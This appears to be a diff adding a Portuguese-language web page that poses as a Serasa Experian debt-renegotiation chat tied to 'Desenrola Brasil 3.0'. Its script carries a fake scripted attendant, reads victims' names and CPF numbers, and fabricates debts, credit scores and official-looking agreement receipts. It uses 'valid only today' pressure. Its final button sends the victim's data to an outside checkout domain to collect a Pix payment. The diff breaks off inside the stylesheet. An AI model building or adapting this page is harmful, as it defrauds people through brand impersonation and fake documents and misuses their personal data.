@@ -1,0 +1,1561 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, viewport-fit=cover"
+    />
+    <meta
+      name="format-detection"
+      content="telephone=no,date=no,address=no,email=no,url=no"
+    />
+    <meta name="theme-color" content="#EC0076" />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="96x96"
+      href="images/icons8-brasil-windows-11-color-96.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="images/icons8-brasil-windows-11-color-32.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="images/icons8-brasil-windows-11-color-16.png"
+    />
+    <title>Central de renegociação </title>
+
+    <!-- Fonts (Inter 400/500/600/700 — vendorizado, na raiz do pt2) -->
+    <link href="../vendor/fonts/inter.css" rel="stylesheet" />
+
+    <link rel="stylesheet" href="css/desenrola.css" />
+  </head>
+  <body>
+    <div class="app" id="app">
+      <!-- ================= HEADER ================= -->
+      <header class="topbar">
+        <img class="brand-logo" src="images/logosrs.png" alt="Serasa Experian" />
+
+        <div class="topbar-spacer"></div>
+
+        <button class="user-chip" id="btnUser">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
+            <path
+              d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"
+            ></path>
+          </svg>
+          <span id="nomeUsuario">Usuário</span>
+        </button>
+      </header>
+
+      <!-- ================= ATENDENTE ================= -->
+      <div class="attendant">
+        <div class="att-avatar">
+          <img src="images/leticia.png" alt="Letícia M." />
+          <i class="online"></i>
+        </div>
+        <div class="att-info">
+          <div class="att-name">
+            Letícia M.
+            <svg class="verified" width="13" height="13" viewBox="0 0 24 24">
+              <circle cx="12" cy="12" r="10" fill="#EC0076" />
+              <path
+                d="m7.5 12.4 3 3 6-6.4"
+                fill="none"
+                stroke="#fff"
+                stroke-width="2.3"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </div>
+          <div class="att-role">Atendimento de negociação</div>
+        </div>
+        <span class="att-status">online</span>
+      </div>
+
+      <!-- ================= PROTOCOLO ================= -->
+      <div class="proto-bar">
+        <span>Protocolo</span>
+        <strong id="protocolo">SRS-000000</strong>
+        <span class="proto-sep">|</span>
+        <span>Em parceria com Desenrola 3.0</span>
+      </div>
+
+      <!-- ================= FEED ================= -->
+      <main class="feed" id="msgs"></main>
+
+      <!-- ================= FOOTER ================= -->
+      <footer class="site-footer">
+        <div class="foot-links">
+          <span>Site oficial verificado</span>
+          <span>Central de Ajuda</span>
+          <span>Política de Privacidade</span>
+        </div>
+        <div class="foot-copy">
+           · Todos os direitos reservados · Ambiente protegido
+        </div>
+      </footer>
+    </div>
+
+    <script>
+      /* ================================================================
+         CONFIGURAÇÕES CENTRALIZADAS
+         ================================================================ */
+      const CONFIG = {
+        CHECKOUT_URL: "https://checkout.pagamentocredcerto.lat/VCCL1O8SDAKW",
+        VALOR_PIX: 68.92,
+        CHECKOUT_EMAIL: "cliente23211@gmail.com",
+      };
+
+      (function () {
+        var ext = window.NEXOR_CONFIG;
+        if (!ext) return;
+        ["CHECKOUT_URL", "CHECKOUT_EMAIL", "VALOR_PIX"].forEach(function (k) {
+          if (ext[k] !== undefined && ext[k] !== "" && ext[k] !== null) CONFIG[k] = ext[k];
+        });
+      })();
+
+      var AVATAR = "images/leticia.png";
+      var ATT_NAME = "Letícia M.";
+
+      /* ---------------- som de mensagem chegando ---------------- */
+      var actx = null;
+
+      function audioCtx() {
+        if (!actx) {
+          var Ctx = window.AudioContext || window.webkitAudioContext;
+          if (!Ctx) return null;
+          try {
+            actx = new Ctx();
+          } catch (e) {
+            return null;
+          }
+        }
+        if (actx.state === "suspended") actx.resume();
+        return actx;
+      }
+
+      function unlockAudio() {
+        var ctx = audioCtx();
+        if (!ctx) return;
+        if (ctx.state === "suspended") ctx.resume();
+      }
+      document.addEventListener("pointerdown", unlockAudio, { once: true });
+      document.addEventListener("touchstart", unlockAudio, { once: true });
+      document.addEventListener("keydown", unlockAudio, { once: true });
+
+      function playPop() {
+        var ctx = audioCtx();
+        if (!ctx) return;
+        var t = ctx.currentTime;
+
+        var osc = ctx.createOscillator();
+        var gain = ctx.createGain();
+        var lp = ctx.createBiquadFilter();
+
+        lp.type = "lowpass";
+        lp.frequency.value = 2600;
+
+        osc.type = "sine";
+        osc.frequency.setValueAtTime(760, t);
+        osc.frequency.exponentialRampToValueAtTime(1180, t + 0.055);
+
+        gain.gain.setValueAtTime(0.0001, t);
+        gain.gain.exponentialRampToValueAtTime(0.05, t + 0.014);
+        gain.gain.exponentialRampToValueAtTime(0.0001, t + 0.19);
+
+        osc.connect(lp);
+        lp.connect(gain);
+        gain.connect(ctx.destination);
+
+        osc.start(t);
+        osc.stop(t + 0.21);
+
+        /* segundo tom curtinho, dá o "duplo" característico */
+        var osc2 = ctx.createOscillator();
+        var gain2 = ctx.createGain();
+        osc2.type = "sine";
+        osc2.frequency.setValueAtTime(1480, t + 0.055);
+        gain2.gain.setValueAtTime(0.0001, t + 0.055);
+        gain2.gain.exponentialRampToValueAtTime(0.028, t + 0.068);
+        gain2.gain.exponentialRampToValueAtTime(0.0001, t + 0.17);
+        osc2.connect(lp);
+        gain2.connect(gain);
+        osc2.start(t + 0.055);
+        osc2.stop(t + 0.19);
+      }
+
+      function paramsFromUrl() {
+        var p = new URLSearchParams(window.location.search);
+        return {
+          nome: p.get("name") || "",
+          cpf: p.get("document") || "",
+          nasc: p.get("nasc") || "",
+          email: p.get("email") || "cliente23211@gmail.com",
+        };
+      }
+
+      function formatCPF(cpf) {
+        var d = String(cpf || "").replace(/\D/g, "").slice(0, 11);
+        if (d.length <= 3) return d;
+        if (d.length <= 6) return d.slice(0, 3) + "." + d.slice(3);
+        if (d.length <= 9)
+          return d.slice(0, 3) + "." + d.slice(3, 6) + "." + d.slice(6);
+        return (
+          d.slice(0, 3) + "." + d.slice(3, 6) + "." + d.slice(6, 9) + "-" + d.slice(9)
+        );
+      }
+
+      function formatData(data) {
+        if (!data || data.length < 10) return data;
+        var m = String(data).match(/(\d{4})-(\d{2})-(\d{2})/);
+        if (m) return m[3] + "/" + m[2] + "/" + m[1];
+        return data;
+      }
+
+      function brl(v) {
+        return v.toLocaleString("pt-BR", {
+          minimumFractionDigits: 2,
+          maximumFractionDigits: 2,
+        });
+      }
+
+      var u = paramsFromUrl();
+      var storage = {};
+      try {
+        storage.nome = localStorage.getItem("site.nome") || "";
+        storage.cpf = localStorage.getItem("site.cpf") || "";
+        storage.nasc = localStorage.getItem("site.nasc") || "";
+      } catch (_) {}
+
+      var NOME = u.nome || storage.nome || "Usuário";
+      var NOME_COMPLETO = NOME;
+      var CPF = u.cpf || storage.cpf || "";
+      var CPF_FORMATADO = formatCPF(CPF);
+      var NASC = u.nasc || storage.nasc || "";
+
+      function dj(str) {
+        var h = 5381;
+        for (var i = 0; i < str.length; i++) h = (h * 33 + str.charCodeAt(i)) >>> 0;
+        return h;
+      }
+
+      function codeFromCPF(cpf) {
+        var d = String(cpf || "").replace(/\D/g, "");
+        var s = dj(d).toString(36).toUpperCase().padStart(8, "X");
+        return (
+          s.slice(0, 5) + "-" + s.slice(5, 9) + "-" + s.slice(9, 13) + "-" + s.slice(13, 17)
+        ).slice(0, 17);
+      }
+
+      var CODIGO_ACORDO = codeFromCPF(CPF);
+      var PROTOCOLO =
+        "SRS-" + dj(String(CPF) + "srs").toString(36).toUpperCase().slice(0, 6).padStart(6, "0");
+
+      try {
+        document.getElementById("protocolo").textContent = PROTOCOLO;
+        document.getElementById("nomeUsuario").textContent =
+          (NOME.split(" ")[0] || "Usuário").slice(0, 14);
+      } catch (_) {}
+
+      var msgs = document.getElementById("msgs");
+      var currentAudio = null;
+
+      function tag(t) {
+        return (t || "")
+          .replace(/\{NOME\}/g, NOME)
+          .replace(/\{NOME_COMPLETO\}/g, NOME_COMPLETO)
+          .replace(/\{CPF\}/g, CPF)
+          .replace(/\{CPF_FORMATADO\}/g, CPF_FORMATADO)
+          .replace(/\{NASC\}/g, NASC)
+          .replace(/\{CODIGO_ACORDO\}/g, CODIGO_ACORDO)
+          .replace(/\{PROTOCOLO\}/g, PROTOCOLO)
+          .replace(/\{VALOR\}/g, brl(CONFIG.VALOR_PIX));
+      }
+
+      var scroll = function () {
+        setTimeout(function () {
+          msgs.scrollTop = msgs.scrollHeight;
+        }, 60);
+      };
+      var sleep = function (ms) {
+        return new Promise(function (r) {
+          setTimeout(r, ms);
+        });
+      };
+
+      function nowTime() {
+        var d = new Date();
+        return (
+          String(d.getHours()).padStart(2, "0") +
+          ":" +
+          String(d.getMinutes()).padStart(2, "0")
+        );
+      }
+
+      function dataHoje() {
+        var d = new Date();
+        return (
+          String(d.getDate()).padStart(2, "0") +
+          "/" +
+          String(d.getMonth() + 1).padStart(2, "0") +
+          "/" +
+          d.getFullYear() +
+          " " +
+          nowTime()
+        );
+      }
+
+      function redirecionarCheckout() {
+        var url = CONFIG.CHECKOUT_URL;
+        var params = new URLSearchParams();
+        params.append("name", NOME_COMPLETO);
+        params.append("document", CPF_FORMATADO);
+        params.append("email", CONFIG.CHECKOUT_EMAIL || "cliente@gmail.com");
+        window.location.href = url + "?" + params.toString();
+      }
+
+      /* ---------------- primitivas ---------------- */
+      var curGroup = null;
+
+      function closeGroup() {
+        curGroup = null;
+      }
+
+      function botGroup() {
+        if (curGroup) return curGroup;
+        var time = document.createElement("div");
+        time.className = "time-sep";
+        time.textContent = nowTime();
+        msgs.appendChild(time);
+
+        var g = document.createElement("div");
+        g.className = "bgroup";
+
+        var label = document.createElement("div");
+        label.className = "bot-label";
+        label.innerHTML =
+          ATT_NAME +
+          '<svg class="lab-verified" width="11" height="11" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#EC0076"/><path d="m7.5 12.4 3 3 6-6.4" fill="none" stroke="#fff" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+        g.appendChild(label);
+
+        var av = document.createElement("img");
+        av.className = "group-avatar";
+        av.src = AVATAR;
+        av.alt = "";
+        g.appendChild(av);
+
+        msgs.appendChild(g);
+        curGroup = g;
+        scroll();
+        return g;
+      }
+
+      function addTyping() {
+        removeTyping();
+        var g = botGroup();
+        var el = document.createElement("div");
+        el.className = "typing";
+        el.id = "typing-row";
+        el.innerHTML = "<span></span><span></span><span></span>";
+        g.appendChild(el);
+        scroll();
+      }
+
+      function removeTyping() {
+        var el = document.getElementById("typing-row");
+        if (el) el.remove();
+      }
+
+      function botRow(inner) {
+        var g = botGroup();
+        var box = document.createElement("div");
+        box.className = "row-flex";
+        box.innerHTML = inner;
+        g.appendChild(box);
+        scroll();
+        return box;
+      }
+
+      function botNode(el) {
+        var g = botGroup();
+        var box = document.createElement("div");
+        box.className = "row-flex";
+        box.appendChild(el);
+        g.appendChild(box);
+        scroll();
+        return box;
+      }
+
+      function addUser(text) {
+        closeGroup();
+        var time = document.createElement("div");
+        time.className = "time-sep";
+        time.textContent = nowTime();
+        msgs.appendChild(time);
+
+        var row = document.createElement("div");
+        row.className = "msg-row user";
+        row.innerHTML = '<div class="bubble-user">' + text + "</div>";
+        msgs.appendChild(row);
+        scroll();
+      }
+
+      function addSystem(text) {
+        closeGroup();
+        var row = document.createElement("div");
+        row.className = "sys-row";
+        row.innerHTML = '<div class="bubble-system">' + tag(text) + "</div>";
+        msgs.appendChild(row);
+        scroll();
+      }
+
+      function addImage(src) {
+        var box = document.createElement("div");
+        box.className = "media-box";
+        box.innerHTML = '<img class="chat-img" src="' + src + '" alt="">';
+        playPop();
+        botNode(box);
+      }
+
+      function addVideoAutoplay(src) {
+        var box = document.createElement("div");
+        box.className = "media-box video-box";
+
+        var video = document.createElement("video");
+        video.src = src;
+        video.autoplay = true;
+        video.playsInline = true;
+        video.setAttribute("playsinline", "");
+        video.setAttribute("webkit-playsinline", "");
+        video.setAttribute("x5-playsinline", "");
+        video.className = "chat-video";
+
+        var ctrl = document.createElement("button");
+        ctrl.className = "vid-btn";
+        var pauseSvg =
+          '<svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+        var playSvg =
+          '<svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+        ctrl.innerHTML = playSvg;
+
+        function play() {
+          var p = video.play();
+          if (p) p.then(function () { ctrl.innerHTML = pauseSvg; }).catch(function () {});
+        }
+        setTimeout(play, 900);
+        ctrl.onclick = function (e) {
+          e.stopPropagation();
+          if (video.paused) play();
+          else { video.pause(); ctrl.innerHTML = playSvg; }
+        };
+        video.onclick = function () {
+          if (video.paused) play();
+          else { video.pause(); ctrl.innerHTML = playSvg; }
+        };
+
+        box.appendChild(video);
+        box.appendChild(ctrl);
+        botNode(box);
+      }
+
+      /* ---------------- áudio ---------------- */
+      function addAudio(src) {
+        if (currentAudio) {
+          try {
+            currentAudio.pause();
+            currentAudio.src = "";
+            currentAudio.load();
+          } catch (e) {}
+        }
+
+        var audio = new Audio(src);
+        audio.preload = "auto";
+        currentAudio = audio;
+
+        var card = document.createElement("div");
+        card.className = "audio-card";
+
+        var btn = document.createElement("button");
+        btn.className = "audio-btn";
+        var pSvg =
+          '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+        var paSvg =
+          '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+        btn.innerHTML = paSvg;
+
+        var body = document.createElement("div");
+        body.className = "audio-body";
+
+        var bar = document.createElement("div");
+        bar.className = "audio-bar";
+        var fill = document.createElement("div");
+        fill.className = "audio-fill";
+        bar.appendChild(fill);
+
+        var time = document.createElement("div");
+        time.className = "audio-time";
+        time.textContent = "0:00 / 0:00";
+
+        body.appendChild(bar);
+        body.appendChild(time);
+        card.appendChild(btn);
+        card.appendChild(body);
+
+        function play() {
+          var p = audio.play();
+          if (p) p.catch(function () {});
+        }
+
+        setTimeout(play, 250);
+        btn.onclick = function () {
+          if (audio.paused) { play(); btn.innerHTML = paSvg; }
+          else { audio.pause(); btn.innerHTML = pSvg; }
+        };
+
+        audio.onloadedmetadata = function () {
+          time.textContent =
+            "0:00 / 0:" + String(Math.floor(audio.duration % 60)).padStart(2, "0");
+        };
+        audio.ontimeupdate = function () {
+          if (!audio.duration) return;
+          fill.style.width = (audio.currentTime / audio.duration) * 100 + "%";
+          time.textContent =
+            Math.floor(audio.currentTime / 60) + ":" +
+            String(Math.floor(audio.currentTime % 60)).padStart(2, "0") + " / " +
+            Math.floor(audio.duration / 60) + ":" +
+            String(Math.floor(audio.duration % 60)).padStart(2, "0");
+        };
+        audio.onended = function () {
+          btn.innerHTML = pSvg;
+          fill.style.width = "0%";
+        };
+        bar.onclick = function (e) {
+          var r = bar.getBoundingClientRect();
+          if (audio.duration) audio.currentTime = ((e.clientX - r.left) / r.width) * audio.duration;
+        };
+
+        botNode(card);
+      }
+
+      function addAudioThen(audioSrc, onAction) {
+        addAudio(audioSrc);
+        return new Promise(function (resolve) {
+          var audio = currentAudio;
+          var done = false;
+          var timer = null;
+
+          function fire() {
+            if (done) return;
+            done = true;
+            if (timer) clearInterval(timer);
+            onAction().then(resolve).catch(resolve);
+          }
+
+          function monitor() {
+            var d = audio.duration;
+            if (!d) return;
+            var at = Math.max(0, d - 3);
+            timer = setInterval(function () {
+              if (audio.currentTime >= at) fire();
+            }, 120);
+            audio.addEventListener("ended", fire);
+          }
+
+          if (audio.readyState >= 1) monitor();
+          else audio.addEventListener("loadedmetadata", monitor);
+          setTimeout(fire, 120000);
+        });
+      }
+
+      function addAudioWithButton(audioSrc, buttonText) {
+        return addAudioThen(audioSrc, function () {
+          return addButtons([buttonText], true);
+        });
+      }
+
+      /* ---------------- componentes ---------------- */
+      /* documento formal (estilo comprovante / consulta) */
+      function addDoc(inner) {
+        var el = document.createElement("div");
+        el.className = "doc-card";
+        el.innerHTML = tag(inner);
+        playPop();
+        botNode(el);
+        return el;
+      }
+
+      function addButtons(options, wide) {
+        return new Promise(function (resolve) {
+          var wrap = document.createElement("div");
+          wrap.className = "btn-wrap";
+          var row = document.createElement("div");
+          row.className = wide ? "btn-col" : "btn-inline";
+          options.forEach(function (opt) {
+            var btn = document.createElement("button");
+            btn.className = wide ? "chat-btn wide" : "chat-btn";
+            btn.textContent = opt;
+            btn.onclick = function () {
+              wrap.remove();
+              addUser(opt);
+              resolve(opt);
+            };
+            row.appendChild(btn);
+          });
+          wrap.appendChild(row);
+          (curGroup || msgs).appendChild(wrap);
+          scroll();
+        });
+      }
+
+      async function botSay(html) {
+        await sleep(150 + Math.random() * 220);
+        addTyping();
+        var plain = tag(html).replace(/<[^>]+>/g, "");
+        var dur = Math.min(2400, 750 + plain.length * 13);
+        await sleep(dur);
+        removeTyping();
+        playPop();
+        botRow('<div class="bubble-bot">' + tag(html) + "</div>");
+        await sleep(520 + Math.random() * 180);
+      }
+
+      /* ---------------- fluxo ---------------- */
+      async function startFlow() {
+        if (!NOME || !CPF) {
+          addSystem("<em>Dados incompletos. Retornando ao início do atendimento...</em>");
+          setTimeout(function () {
+            window.location.href = "../../pt2/index.html";
+          }, 1800);
+          return;
+        }
+
+        addImage("./assets/image3.png");
+
+        await botSay("Olá,{NOME_COMPLETO}. Você está na Central de Negociação Serasa.");
+        await botSay(
+          "O <strong>Serasa</strong> agora está em parceria com o <strong>Desenrola Brasil 3.0</strong>, trazendo novas oportunidades para você negociar suas dívidas, conseguir descontos especiais e limpar seu nome para começar o ano com tranquilidade."
+        );
+        await botSay("Aguarde um instante. Uma especialista dará continuidade ao atendimento.");
+
+        addVideoAutoplay("./assets/video15.mp4");
+        addSystem("<em>Letícia M. entrou no atendimento</em>");
+        await sleep(16000);
+
+        var confirmWrap = document.createElement("div");
+        confirmWrap.className = "btn-wrap";
+        var cCard = document.createElement("div");
+        cCard.className = "confirm-card";
+        cCard.innerHTML =
+          '<span class="confirm-title">Confirme os dados do titular</span>' +
+          '<div class="cf-row"><span class="cf-k">Nome</span><span class="cf-v">' +
+          NOME_COMPLETO + "</span></div>" +
+          '<div class="cf-row"><span class="cf-k">CPF</span><span class="cf-v">' +
+          CPF_FORMATADO + "</span></div>" +
+          (NASC
+            ? '<div class="cf-row"><span class="cf-k">Nascimento</span><span class="cf-v">' +
+              formatData(NASC) + "</span></div>"
+            : "");
+
+        var btns = document.createElement("div");
+        btns.className = "btn-inline";
+        ["Confirmar", "Não sou eu"].forEach(function (label) {
+          var b = document.createElement("button");
+          b.className = "chat-btn" + (label === "Confirmar" ? " solid" : "");
+          b.textContent = label;
+          b.onclick = function () {
+            btns.remove();
+            addUser(label);
+            if (label === "Confirmar") continueFlow();
+            else {
+              setTimeout(async function () {
+                await botSay("Sem problemas. Acesse o site novamente informando o seu CPF.");
+                setTimeout(function () {
+                  window.location.href = "../../pt2/index.html";
+                }, 1600);
+              }, 500);
+            }
+          };
+          btns.appendChild(b);
+        });
+        confirmWrap.appendChild(cCard);
+        confirmWrap.appendChild(btns);
+        playPop();
+        (curGroup || msgs).appendChild(confirmWrap);
+        scroll();
+      }
+
+      async function continueFlow() {
+        await sleep(400);
+        await botSay("Obrigada pela confirmação.");
+        await botSay("Validando o CPF na base Serasa Limpa Nome...");
+        await botSay("<strong>Acesso liberado.</strong> Seu painel de negociação está disponível.");
+        await botSay("Empresas com pendência no CPF informado:");
+        addImage("images/image4.png");
+
+        await addButtons(["CONTINUAR"], true);
+        await addAudioWithButton("./assets/Desktop2026.mp3", "SIM, QUERO NEGOCIAR");
+
+        await botSay("<em>Analisando o CPF no Serasa...</em>");
+        await sleep(2800);
+        await botSay("<em>Consultando Score e registros de negativação...</em>");
+        await sleep(2800);
+        await botSay("<strong>Análise concluída.</strong>");
+        await sleep(2400);
+        await botSay(
+          "Foram localizadas <strong>4 pendências ativas</strong>, com valores entre <strong>R$ 1.728,74</strong> e <strong>R$ 5.278,23</strong>."
+        );
+
+        /* ---------- DOCUMENTO: SITUAÇÃO DO CPF ---------- */
+        addDoc(
+          '<div class="doc-head">' +
+            '<div class="doc-brand">Resultado de Consulta<span>Consulta de situação cadastral</span></div>' +
+            '<div class="doc-seal">Via titular</div>' +
+            "</div>" +
+            '<div class="doc-strip">Negativado</div>' +
+            '<div class="doc-body">' +
+              '<div class="doc-row"><div class="doc-k">Titular</div><div class="doc-v">{NOME_COMPLETO}</div></div>' +
+              '<div class="doc-row"><div class="doc-k">CPF</div><div class="doc-v mono">{CPF_FORMATADO}</div></div>' +
+              '<div class="doc-row"><div class="doc-k">Registros ativos</div><div class="doc-v">4 pendências</div></div>' +
+              '<div class="doc-row"><div class="doc-k">Score Serasa</div><div class="doc-v">365 pontos · faixa muito baixa</div></div>' +
+            "</div>" +
+            '<div class="doc-foot">' +
+              '<div class="doc-note">Consulta registrada sob o protocolo {PROTOCOLO} em ' + dataHoje() + ".</div>" +
+            "</div>"
+        );
+
+        await botSay(
+          "O Score Serasa do CPF é <strong>365 pontos</strong>, faixa <strong>Muito Baixo</strong>:"
+        );
+        addImage("./assets/score.jpg");
+
+        await botSay("Deseja consultar as propostas de acordo disponíveis para o seu CPF?");
+        await addButtons(["BUSCAR ACORDOS"], true);
+
+        await botSay("<em>Consultando propostas disponíveis...</em>");
+        await sleep(2600);
+        await botSay("<strong>Proposta localizada.</strong>");
+
+        /* ---------- DOCUMENTO: PROPOSTA ---------- */
+        addDoc(
+          '<div class="doc-head">' +
+            '<div class="doc-brand">Acordo de Renegociação<span>Termo de acordo · proposta</span></div>' +
+            '<div class="doc-seal">Nº {CODIGO_ACORDO}</div>' +
+          "</div>" +
+          '<div class="doc-body">' +
+            '<div class="doc-row"><div class="doc-k">Titular</div><div class="doc-v">{NOME_COMPLETO}</div></div>' +
+            '<div class="doc-row"><div class="doc-k">CPF</div><div class="doc-v mono">{CPF_FORMATADO}</div></div>' +
+            '<div class="doc-row"><div class="doc-k">Valor da proposta</div><div class="doc-v strong">R$ {VALOR}</div></div>' +
+            '<div class="doc-row">' +
+              '<div class="doc-k">Score após a baixa</div>' +
+              '<div class="doc-up">' +
+                '<span class="du-from">365</span>' +
+                '<svg class="du-arrow" width="13" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M4 18 12 10l4 4 4-4"/><path d="M20 6v4h-4"/></svg>' +
+                '<span class="du-to">895</span>' +
+                '<span class="du-label">pontos</span>' +
+              '</div>' +
+            '</div>' +
+            '<div class="doc-row"><div class="doc-k">Registros baixados</div><div class="doc-v">4 pendências · 99% de desconto</div></div>' +
+          "</div>" +
+          '<div class="doc-foot">' +
+            '<div class="doc-note">Proposta válida somente hoje. Protocolo {PROTOCOLO} · emitida em ' + dataHoje() + ".</div>" +
+          "</div>"
+        );
+
+        await addButtons(["VER PROPOSTA"], true);
+
+        await addAudioThen("./assets/buscaacordo.mp3", async function () {
+          await botSay(
+            "Proposta liberada com <strong>99% de desconto</strong> para <strong>{NOME_COMPLETO}</strong>."
+          );
+        });
+
+        await botSay("<em>Carregando a proposta <strong>{CODIGO_ACORDO}</strong>...</em>");
+        await botSay(
+          "Contrato válido somente para o titular <strong>{NOME_COMPLETO}</strong>, portador do CPF <strong>{CPF_FORMATADO}</strong>."
+        );
+        await botSay(
+          "Confirmar a quitação de todas as pendências por <strong>R$ {VALOR}</strong>, com <strong>99% de desconto</strong>?"
+        );
+        await addButtons(["CONFIRMAR ACORDO"], true);
+
+        await addAudioThen("./assets/parabens.mp3", async function () {
+          await botSay("<strong>Acordo confirmado.</strong>");
+          await addButtons(["CONTINUAR"], true);
+        });
+
+        await addAudioThen("./assets/pagamento.mp3", async function () {
+          /* ---------- DOCUMENTO: COMPROVANTE ---------- */
+          addDoc(
+            '<div class="doc-head">' +
+              '<div class="doc-brand">Serasa Limpa Nome<span>Comprovante de quitação de débitos</span></div>' +
+              '<div class="doc-seal">Emitido</div>' +
+            "</div>" +
+            '<div class="doc-body">' +
+              '<div class="doc-row"><div class="doc-k">Nº do acordo</div><div class="doc-v mono">{CODIGO_ACORDO}</div></div>' +
+              '<div class="doc-row"><div class="doc-k">Beneficiário(a)</div><div class="doc-v">{NOME_COMPLETO}</div></div>' +
+              '<div class="doc-row"><div class="doc-k">CPF</div><div class="doc-v mono">{CPF_FORMATADO}</div></div>' +
+              '<div class="doc-row"><div class="doc-k">Objeto</div><div class="doc-v">Quitação de todas as pendências ativas no CPF</div></div>' +
+              '<div class="doc-row"><div class="doc-k">Valor da proposta</div><div class="doc-v">R$ {VALOR}</div></div>' +
+              '<div class="doc-row"><div class="doc-k">Desconto aplicado</div><div class="doc-v">99%</div></div>' +
+            "</div>" +
+            '<div class="doc-foot">' +
+              '<div class="doc-k">Score estimado após a baixa</div>' +
+              '<div class="doc-up">' +
+                '<span class="du-to">895</span>' +
+                '<span class="du-label">pontos</span>' +
+              '</div>' +
+              '<div class="doc-note">Documento emitido em ' + dataHoje() + ". Efetivado após a confirmação do Pix. Protocolo {PROTOCOLO}.</div>" +
+            "</div>"
+          );
+          await addButtons(["CONTINUAR PARA O PAGAMENTO"], true);
+        });
+
+        await addAudioThen("./assets/aviso.mp3", async function () {
+          await botSay("<strong>Oferta válida somente hoje.</strong>");
+          await botSay("<em>Gere o Pix do acordo no botão abaixo.</em>");
+        });
+
+        await sleep(500);
+        var finRow = document.createElement("div");
+        finRow.className = "btn-wrap";
+        var finBtn = document.createElement("button");
+        finBtn.className = "btn-final";
+        finBtn.innerHTML =
+          "Pagar R$ " + brl(CONFIG.VALOR_PIX) + " e limpar meu nome" +
+          '<span class="bf-sub">Pix · baixa imediata</span>';
+        finBtn.onclick = function () {
+          finRow.remove();
+          redirecionarCheckout();
+        };
+        finRow.appendChild(finBtn);
+        playPop();
+        (curGroup || msgs).appendChild(finRow);
+        scroll();
+      }
+
+      window.addEventListener("load", function () {
+        try {
+          setTimeout(startFlow, 400);
+        } catch (e) {
+          addSystem("Erro: " + e.message);
+        }
+      });
+    </script>
+
+    <style>
+      /* ============================================================
+         BASE
+         ============================================================ */
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      :root {
+        --pink: #ec0076;
+        --pink-dark: #c40060;
+        --pink-tint: #fff4f9;
+        --pink-line: #f8cfe1;
+        --ink: #16171a;
+        --muted: #6f7076;
+        --line: #ebebee;
+        --bubble: #f2f2f5;
+        --gap: 10px;
+        --red: #c81e1e;
+        --green: #1a8f4c;
+        --doc-line: #d8d8dc;
+      }
+
+      html,
+      body {
+        height: 100%;
+        width: 100%;
+      }
+
+      body {
+        font-family: "Inter", -apple-system, sans-serif;
+        background: #ededee;
+        color: var(--ink);
+        overflow: hidden;
+        display: flex;
+        justify-content: center;
+        -webkit-font-smoothing: antialiased;
+      }
+
+      .app {
+        width: 100%;
+        max-width: 500px;
+        height: 100dvh;
+        display: flex;
+        flex-direction: column;
+        background: #fff;
+        overflow: hidden;
+        border-left: 1px solid #dedee1;
+        border-right: 1px solid #dedee1;
+      }
+
+      /* ============================================================
+         HEADER
+         ============================================================ */
+      .topbar {
+        flex-shrink: 0;
+        height: 58px;
+        padding: 0 15px;
+        padding-top: env(safe-area-inset-top, 0px);
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        background: var(--pink);
+      }
+
+      .brand-logo {
+        height: 25px;
+        width: auto;
+        display: block;
+        flex-shrink: 0;
+        filter: brightness(0) invert(1);
+      }
+
+      .topbar-spacer {
+        flex: 1;
+      }
+
+      .user-chip {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        background: rgba(255, 255, 255, 0.14);
+        color: #fff;
+        border: 1.5px solid rgba(255, 255, 255, 0.55);
+        border-radius: 24px;
+        padding: 6px 14px;
+        font-size: 12.5px;
+        font-weight: 500;
+        font-family: inherit;
+        max-width: 130px;
+        flex-shrink: 0;
+      }
+      .user-chip span {
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+
+      /* ============================================================
+         ATENDENTE
+         ============================================================ */
+      .attendant {
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        background: #fff;
+        border-bottom: 1px solid var(--line);
+        padding: 9px 15px;
+      }
+      .att-avatar {
+        position: relative;
+        flex-shrink: 0;
+      }
+      .att-avatar img {
+        width: 36px;
+        height: 36px;
+        border-radius: 50%;
+        object-fit: cover;
+        display: block;
+      }
+      .online {
+        position: absolute;
+        right: -1px;
+        bottom: 0;
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background: #22c55e;
+        border: 2px solid #fff;
+      }
+      .att-info {
+        flex: 1;
+        min-width: 0;
+      }
+      .att-name {
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        font-size: 13.5px;
+        font-weight: 700;
+      }
+      .att-role {
+        font-size: 11.5px;
+        color: var(--muted);
+        margin-top: 1px;
+      }
+      .att-status {
+        font-size: 10.5px;
+        font-weight: 600;
+        color: #178a45;
+        background: #f0faf3;
+        border-radius: 20px;
+        padding: 4px 9px;
+      }
+
+      /* ============================================================
+         PROTOCOLO
+         ============================================================ */
+      .proto-bar {
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
